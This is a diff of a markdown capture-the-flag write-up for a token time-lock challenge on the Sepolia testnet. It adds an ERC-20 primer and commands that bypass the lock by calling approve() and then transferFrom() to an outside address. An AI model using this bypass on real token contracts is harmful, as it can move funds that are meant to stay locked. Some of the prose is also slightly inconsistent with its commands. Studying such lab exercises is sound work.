@@ -62,18 +62,47 @@ Next, there is a **lockTokens** modifier. It checks whether the sender is the pl
 - If it is, the modifier requires that the current timestamp is greater than the **timeLock** variable, effectively enforcing the time lock. If the condition is met, the modifier allows the function to proceed.
 - If the sender is not the **player** address, the modifier allows the function to proceed without imposing any time restrictions.
 
+## ERC20 Standard
+
+The ERC-20 standard, short for Ethereum Request for Comment 20, is a technical standard used for the implementation of fungible tokens on the Ethereum blockchain. Fungible tokens are digital assets that are interchangeable with each other, meaning one token is equivalent to another and can be used interchangeably.
+
+The ERC-20 standard defines a set of rules and interfaces that smart contracts must adhere to in order to enable seamless interaction with other contracts and decentralized applications (DApps) on the Ethereum network. Following this standard ensures that tokens will be compatible with various wallets, exchanges, and other decentralized services, fostering interoperability and ease of use.
+
+Key Features of ERC-20:
+
+- **Basic Functionality:** ERC-20 tokens must implement a specific set of functions that allow for basic operations such as transferring tokens between addresses, checking an account's token balance, and approving third-party addresses to spend tokens on behalf of the token holder.
+- **Token Identification:** Each token contract must provide a name and symbol for identification purposes. For example, a token representing a fictional currency could have the name "MyToken" and the symbol "MTK."
+- **Decimal Precision:** ERC-20 tokens have a fixed decimal precision, meaning the contract specifies the number of decimal places the token can be divided into. For example, a precision of 18 means that 1 token can be divided into 10^18 smaller units (called "wei" in Ethereum).
+- **Total Supply:** The contract must track the total supply of tokens minted, and it should be possible to query the total supply at any time.
+- **Account Balances:** ERC-20 tokens must keep track of the balance of each token holder's account, and it should be possible to query the balance of any specific account.
+- **Token Transfer:** The contract should provide a function to allow token holders to transfer tokens from their account to another specified account.
+- **Approvals and Allowances:** Token holders can approve other addresses to spend a certain number of tokens on their behalf. This feature is often used for interactions with other contracts, such as decentralized exchanges.
+- **Events:**  ERC-20 tokens often use events to emit notifications about specific contract-related activities, like token transfers or approvals.
+
+It's important to note that while the ERC-20 standard has become the de facto standard for token implementation on the Ethereum blockchain, it does not address all use cases. For example, non-fungible tokens (NFTs) have unique properties and are governed by different standards like ERC-721 and ERC-1155. Nevertheless, ERC-20 remains a fundamental standard for creating fungible tokens that are widely supported within the Ethereum ecosystem.
+
+
 # Subverting
 
+In this example, we can transfer our balance to another address with the `transferFrom()` function even if the contract requires the timeLock's time for transferring tokens. But, we must give an allowance for some addresses for using the transferFrom() function. That's why, we should call `approve()` function which helps us to define our beneficiary address and legacy value. Let's test it!
+
+
+First in first, check our balance.
 
 ```shell
 (await contract.balanceOf(player)).toString()
 '1000000000000000000000000'
 ```
 
+Let's look at the amount which spender is still allowed to withdraw from player. That is zero because of we didn't define any allowance.
+
+
+```solidity
 (await contract.allowance(player, player)).toString()
 '0'
+```
 
-See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xee4d5333cc4c60ddde903a5c938c01c705b34632224f36b6979b5b445fb1e34e)
+In this turn, we have defined us as a `_spender` of 10000000000000000000000000 tokens with approve() function. See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xee4d5333cc4c60ddde903a5c938c01c705b34632224f36b6979b5b445fb1e34e)
 
 ```shell
 await contract.approve(player, "1000000000000000000000000")
@@ -84,12 +113,13 @@ await contract.approve(player, "1000000000000000000000000")
 '1000000000000000000000000'
 ```
 
-See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xe31cef4e74fa793caf8cda4c87b1341d0be88ff0df35137057fc8f1cbd4db4d2)
+In the final step, we transfer all balance to my ex address as a **spender role**. So, we don't attached the require statement. See transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xe31cef4e74fa793caf8cda4c87b1341d0be88ff0df35137057fc8f1cbd4db4d2)
 
 ```shell
 await contract.transferFrom(player,"0x80aCA4707d5A7B83B6Df80155ee46179AE678d2e","1000000000000000000000000")
 ```
 
+And, we have set the balance to zero. In other words, we have passed the challenge!
 
 ```shell
 (await contract.balanceOf(player)).toString()
